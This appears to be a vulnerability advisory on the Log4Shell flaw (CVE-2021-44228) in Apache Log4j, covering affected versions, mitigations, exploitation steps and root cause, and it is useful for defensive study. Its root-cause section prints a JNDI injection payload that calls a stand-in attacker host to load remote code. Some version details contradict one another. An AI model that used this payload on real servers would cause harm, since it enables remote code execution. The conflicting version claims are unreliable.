## Description

Apache Log4j in Apache Software Foundation Log4j versions prior to 2.15.0 is vulnerable due to insufficient input validation, specifically related to JNDI lookups [[5]](#引用) . This vulnerability allows an unauthenticated attacker to execute arbitrary code on a server via crafted log messages containing malicious data [[4]](#引用) . The vulnerability, known as Log4Shell, has been exploited extensively [[3]](#引用) , leading to widespread security incidents, particularly on public-facing servers [[11]](#引用) . Despite the critical nature of this flaw, many applications continue to operate on affected versions [[3]](#引用) , maintaining a significant risk for data breaches and unauthorized access across systems relying on the Log4j library [[2]](#引用) .

## Detailed Description

CVE-2021-44228, commonly known as Log4Shell, is a critical vulnerability found in the Apache Log4j 2 logging library, which is extensively utilized across various Java applications [[4]](#引用) . This vulnerability allows attackers to execute arbitrary code on a server by crafting malicious log messages that the Log4j component processes, taking advantage of the Java Naming and Directory Interface (JNDI) lookup features [[7]](#引用) . The flaw affects versions of Log4j from 2.0 to 2.15.0-rc1 [[1]](#引用) [[6]](#引用) . Attackers can exploit this vulnerability without requiring prior authentication or user interaction, which makes it particularly dangerous for internet-facing applications and services [[7]](#引用) . Once exploited, attackers can gain full control over the vulnerable system, enabling them to deploy further malicious software, conduct reconnaissance, or exfiltrate sensitive data [[11]](#引用) . The severity of Log4Shell has led to its inclusion as a top priority for organizations to address, with a CVSS score of 10, indicating critical risk [[5]](#引用) . Despite the patches that were released following its discovery in December 2021, a significant portion of systems (approximately 38% as of late 2023) remained vulnerable due to the continued use of affected Log4j versions [[3]](#引用) [[5]](#引用) . This vulnerability has been actively exploited in various cyber campaigns, notably by threat actors such as the North Korean APT group, Lazarus [[11]](#引用) . Their operations leverage this flaw to compromise vulnerable servers, particularly targeting publicly accessible systems like VMWare Horizon [[2]](#引用) . The ongoing exploitation of CVE-2021-44228 illustrates the persistent threats posed by vulnerabilities in widely adopted open-source components, underscoring the necessity for organizations to maintain rigorous patch management and security hygiene [[3]](#引用) .

## Affected Versions

- Component: Apache Log4j
    - Affected Versions: All versions before 2.15.0 [[10]](#引用) 
- Component: Apache Log4j2
    - Affected Versions: 2.0 – 2.15.0-rc1 [[1]](#引用) 
- Component: Log4j
    - Affected Versions: Versions prior to 2.15.0 (inclusive) [[11]](#引用) 

## Unaffected Versions

- Component: Apache Log4j2
    - Unaffected Versions: 2.16.0 and later [[1]](#引用) 
- Component: Log4j
    - Unaffected Versions: 2.17.0 [[3]](#引用) 


## Mitigations

- Regularly update systems to ensure all software is patched against known vulnerabilities, particularly CVE-2021-44228 [[8]](#引用) .
- Upgrade Apache Log4j2 to version 2.17.0 or higher [[6]](#引用) .
- Remove the JndiLookup class from the class path to mitigate JNDI injection issues [[6]](#引用) .
- Disable JNDI functionality in the Log4j2 configuration [[1]](#引用) .
- Implement input validation and sanitization to prevent processing of malicious data [[6]](#引用) .
- Maintain an inventory of applications that use vulnerable open-source libraries [[10]](#引用) .
- Monitor networks for unusual activity to detect exploitation attempts [[8]](#引用) .
- Utilize intrusion detection and prevention systems (IDS/IPS) to block potential exploits [[8]](#引用) [[3]](#引用) .
- Implement network segmentation to limit access to vulnerable services [[8]](#引用) [[3]](#引用) .
- Regularly scan for vulnerable versions of Log4j in applications [[3]](#引用) .
- Conduct regular audits to identify remaining instances of vulnerable Log4j code [[11]](#引用) .
- Establish firewall rules to restrict access to public-facing applications using Log4j [[11]](#引用) .

## Exploitability

CVE-2021-44228, widely known as Log4Shell, is a critical flaw in the Apache Log4j 2 library, specifically impacting versions from 2.0 to 2.15.0-rc1 [[10]](#引用) . The vulnerability arises from a JNDI injection issue, which allows attackers to send specially crafted data to the logging component of applications using Log4j [[1]](#引用) . When such data is logged, the library processes it in a way that may trigger remote code execution (RCE) on the vulnerable server [[6]](#引用) . To exploit this vulnerability, an attacker follows several steps: 1. Target Identification: The attacker first identifies servers that are publicly accessible and running vulnerable versions of Log4j [[10]](#引用) . 2. Payload Creation: The attacker crafts a malicious payload that typically includes a JNDI lookup string. This payload is designed to cause Log4j to fetch and execute code from a remote server controlled by the attacker [[1]](#引用) . 3. Send Malicious Input: The attacker triggers the logging mechanism in the application by sending the crafted payload as part of a log message (e.g., through HTTP headers or user input). This action can be as simple as including the payload in an input field that is logged by the application [[10]](#引用) . 4. Remote Code Execution: Upon receiving the malicious log message, the Log4j component interprets the payload, performs the lookup, and executes the code present in the attacker’s controlled server, granting the attacker RCE capabilities on the compromised system [[10]](#引用) [[6]](#引用) . 5. Post-Exploitation Activities: After gaining access, attackers typically conduct reconnaissance to assess the environment, deploy additional malware (such as remote access trojans like NineRAT) [[4]](#引用) , and establish persistence (e.g., creating new admin accounts or downloading credential harvesting tools) [[4]](#引用) . 6. Command-and-Control Operations: Utilizing command-and-control (C2) methods, such as Telegram for communications [[4]](#引用) , the attacker can manage the infected systems remotely, gather intelligence, and further exploit the network to deepen their access and control [[10]](#引用) [[1]](#引用) . The vulnerability's significant impact and ease of exploitation have led to widespread concern, prompting organizations to expedite patching and mitigation efforts [[10]](#引用) .

## Root Cause

The root cause of the CVE-2021-44228 vulnerability arises from two main parts: 

1. Improper validation of user-supplied input: The first part of the root cause is the direct logging of user input without any validation or sanitization. This allows for the possibility of malicious input being logged as part of the application’s logging mechanism. When the application logs user input without checking whether it contains harmful commands or data, such as JNDI references, it opens the door for executing unintended operations [[10]](#引用) . An example code snippet demonstrating this part from the vulnerable code can be seen in the `logUserInput` method:

```java
public void logUserInput(String userInput) {
    // Directly logging user input without validation
    logger.info("User input: " + userInput);
}
```
In this code, if an attacker inputs something like `${jndi:ldap://attacker.com/a}`, it will be logged and subsequently processed by the Log4j library, potentially leading to severe security implications [[4]](#引用) .

2. Unsafe interpolation of strings: The second part of the root cause is the handling of JNDI lookups without checking the resulting strings against a whitelist of acceptable protocols, hosts, and classes. The interpolation of user input strings, particularly in the context of JNDI lookups, means that certain commands can be executed outside the intended behavior [[3]](#引用) [[7]](#引用) . A relevant code snippet from the patch context that addresses this concern is in the `JndiManager` class:

```java
public synchronized <T> T lookup(final String name) throws NamingException {
    try {
        URI uri = new URI(name);
        if (uri.getScheme() != null) {
            if (!allowedProtocols.contains(uri.getScheme().toLowerCase(Locale.ROOT))) {
                LOGGER.warn("Log4j JNDI does not allow protocol {}", uri.getScheme());
                return null;
            }
            ...
        }
    } catch (URISyntaxException ex) {
        // This is OK.
    }
}
```
The failure to restrict JNDI lookups to specific, known, and safe protocols and classes exposes the application to external attacks that leverage these features [[5]](#引用) [[2]](#引用) . Without implementing checks on the protocol and the entity being accessed, malicious actors can redirect lookups to harmful external services, leading to unauthorized access and potential remote code execution [[9]](#引用) . Together, these factors illustrate how the combination of improper input validation and inadequate control over JNDI lookups creates a significant security risk within the application [[4]](#引用) .


## 引用

- [1]  https://mp.weixin.qq.com/s?src=11&timestamp=1698058895&ver=4852&signature=D4lbsrFvrwtVXl9Mbakz-RzczqMOQZKMQkQ4DOMRNaUWQd3*cdenHFM4SohtOZVGy9FkrfPY7Gc*y89NrdnMQRBt-B6QjWEQMr99h6jiJkdel51wo3Iyo2ccfc9pSSNE&new=1
- [2]  https://securityaffairs.com/155681/apt/operation-blacksmith-lazarus-log4j.html
- [3]  https://thehackernews.com/2023/12/lazarus-group-using-log4j-exploits-to.html
- [4]  https://go.theregister.com/feed/www.theregister.com/2023/12/11/lazarus_group_edang/
- [5]  https://www.darkreading.com/threat-intelligence/lazarus-group-still-juicing-log4shell-rats-written-d
- [6]  https://www.anquanke.com/post/id/290837
- [7]  https://www.securityweek.com/north-korean-hackers-developing-malware-in-dlang-programming-language/
- [8]  https://securelist.com/it-threat-evolution-q3-2023-non-mobile-statistics/111228/
- [9]  https://therecord.media/north-korean-hackers-using-log/
- [10]  https://www.beyondtrust.com/blog/entry/trick-or-threat
- [11]  https://therecord.media/north-korean-hackers-using-log

